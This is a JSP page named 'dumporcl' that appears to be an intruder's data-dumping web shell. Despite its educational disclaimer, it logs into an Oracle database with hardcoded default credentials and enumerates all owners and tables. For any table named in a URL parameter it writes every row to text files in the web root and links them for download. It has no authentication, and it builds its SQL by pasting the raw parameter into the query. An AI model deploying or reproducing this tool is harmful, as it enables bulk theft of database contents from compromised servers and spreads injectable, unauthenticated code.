<%@ page import="java.io.*" %>
<%@ page import="java.sql.*" %>
<%
/*
This text is meant for people to learn and be aware of security. 
if you try anything that's considered illegal with the information found in this text you will be to blame yourself,
we cannot be blamed for other people's actions. 
remember that security is very important and thus should not be neglected by the people holding the strings. 
*/
String scheme = request.getScheme();
String netloc = request.getServerName();
int    port   = request.getServerPort();
String contextpath   = request.getContextPath();
String servletpath   = request.getServletPath();

String baseUrl = scheme + "://" + netloc + ":" + port + contextpath + "/";
String selfUrl = scheme + "://" + netloc + ":" + port + contextpath + servletpath;
out.println(baseUrl + "<br />");
out.println(selfUrl + "<br />");
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>dumporcl</title>
<base href="<%=baseUrl%>" target="_blank" />
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1" />
<meta name="robots" content="noindex" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="pragma" content="no-cache" />
</head>
<body>
<% 
String dbDriver = "oracle.jdbc.driver.OracleDriver";
String dbUrl    = "jdbc:oracle:thin:@192.168.2.200:1521:radius";
String dbUser   = "oracle";
String dbPass   = "oracle";



try{
	// make a connection to Oracle database with jdbc driver.
	Class.forName(dbDriver).newInstance();
	Connection conn = DriverManager.getConnection(dbUrl, dbUser, dbPass);

	conn.setAutoCommit(false);

	String tbname = request.getParameter("tb"); // tablename


	if (tbname == null){
		// without the paramaeter ['tb']
	
        String sql_dbnames   =  "SELECT DISTINCT owner FROM all_tables";
        String sql_tbnames   =  "SELECT owner, table_name FROM all_tables";

	    Statement stmt_dbnames  =  conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);
		Statement stmt_tbnames  =  conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);
	
        ResultSet rs_dbnames =  stmt_dbnames.executeQuery(sql_dbnames);
        ResultSet rs_tbnames =  stmt_tbnames.executeQuery(sql_tbnames);
        
		// --------------- Return ALL DATABASES --------------------
		out.print("<H3>ALL DATABASES: </H3><br />");
        while (rs_dbnames.next()){
			String sql_dbname = rs_dbnames.getString(1);
			out.print(sql_dbname + "<br />");
		}

		// --------------- Return ALL TABLES --------------------
        out.print("<H3>ALL TABLES: </H3><br />");
		while (rs_tbnames.next()){
			String sql_dbowner= rs_tbnames.getString(1);
			String sql_tbname = rs_tbnames.getString(2);
			String tbUrl = sql_dbowner + " ---- <a href=\"" + selfUrl + "?tb=" + sql_tbname + "\" target=_blank>" + sql_tbname + "</a><br />";
			out.print(tbUrl);
		}

		rs_dbnames.close();
		rs_tbnames.close();
		stmt_dbnames.close();
		stmt_tbnames.close();
		
	}
	else{
		// with the parameter ['tb']
		out.print("<H3>CurTable: " + tbname + "</H3><br />");

        /* ------------------------SQL Query-------------------------------- */

        String sql_all_total_columns = "SELECT count(*) FROM all_tab_columns WHERE table_name = '" + tbname + "'";
        String sql_tab_all_columns   = "SELECT * FROM all_tab_columns WHERE table_name = '" + tbname + "'";
        String sql_tab_total_columns = "SELECT count(*) FROM " + tbname;

        Statement stmt_all_total_columns = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);
		Statement stmt_tab_all_columns   = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);
        Statement stmt_tab_total_columns = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);

        ResultSet rs_all_total_columns = stmt_all_total_columns.executeQuery(sql_all_total_columns);
		ResultSet rs_tab_all_columns   = stmt_tab_all_columns.executeQuery(sql_tab_all_columns);
		ResultSet rs_tab_total_columns = stmt_tab_total_columns.executeQuery(sql_tab_total_columns);
		
        // sql_total_colomnus <-------> sql_total_tab_columns

        conn.commit();

		/* -------------------------Deal With Query Result------------------------------ */
		int int_all_total_columns = 0;
		int int_tab_total_columns = 0;
		int int_tab_all_columns   = 0;
		int total = 0;
		int size = 30000;

		while (rs_all_total_columns.next()){
            int_all_total_columns = Integer.parseInt(rs_all_total_columns.getString(1));
		}

		while (rs_tab_total_columns.next()){
		    int_tab_total_columns = Integer.parseInt(rs_tab_total_columns.getString(1));
			//out.print("Total records: " + int_tab_total_columns + "<br />");  // ---------- *****
		}
        out.print("Total records: " + int_tab_total_columns + "<br />");

        String column_name = "";
		while (rs_tab_all_columns.next()) {
           column_name +=  " ," + rs_tab_all_columns.getString(3);
		   int_tab_all_columns += 1;
		}
		rs_tab_all_columns.close();
		rs_all_total_columns.close();

        stmt_all_total_columns.close();
		stmt_tab_all_columns.close();
        
		// ------------------------------------------
        total = int_tab_total_columns;

		while (true) {
			if (total <= size){
				total = 0;
			}else{
				total = total - size;  // set [size] as a loop variable 
			}

        // ------------- [55000 - 85000] ----------
		// --------------[25000 - 50000] ----------
		// --------------[00000 - 25000] ----------
		// SELECT * FROM database.tablename ---- Attention Here !!!!
		String sql_dump = "SELECT * FROM (SELECT rownum r " + column_name + " FROM ORACLE." + tbname + " WHERE rownum<=" + int_tab_total_columns + ") where r >= " + total;
		out.print(sql_dump + "<br />");
        int_tab_total_columns -= size;
         
		Statement stmt_sql_dump = conn.createStatement(ResultSet.TYPE_SCROLL_SENSITIVE,ResultSet.CONCUR_UPDATABLE);
        ResultSet rs_sql_dump   = stmt_sql_dump.executeQuery(sql_dump);

		conn.commit();

        String filename = tbname +"--["+ total + " - " + int_tab_total_columns + "].txt";
		String filepath = request.getRealPath(filename);
		java.io.File f = new java.io.File(filepath);

		if (!f.exists()){
			f.createNewFile();
		}

		try{
			PrintWriter pw = new PrintWriter(new FileOutputStream(filepath));
			while (rs_sql_dump.next()){

				int_tab_all_columns = 1;

				while(int_tab_all_columns <= int_all_total_columns){
					pw.print(rs_sql_dump.getString(int_tab_all_columns));
					pw.print(",");
					int_tab_all_columns += 1;
				}
				pw.println("");

			}
			pw.close();

		}catch(IOException e){
			out.println(e.getMessage());
		}

		String f_sql_dump = "<br /><a href=\"" + baseUrl + filename + "\">" + filename + "</a></br>";
		out.print(f_sql_dump);

        if (total == 0){
		    rs_sql_dump.close();
			stmt_sql_dump.close();
			break;
		}
		}
	}
	conn.close();
}
catch(SQLException err)
{
	out.println(err.toString());
}
%>
</body>
</html>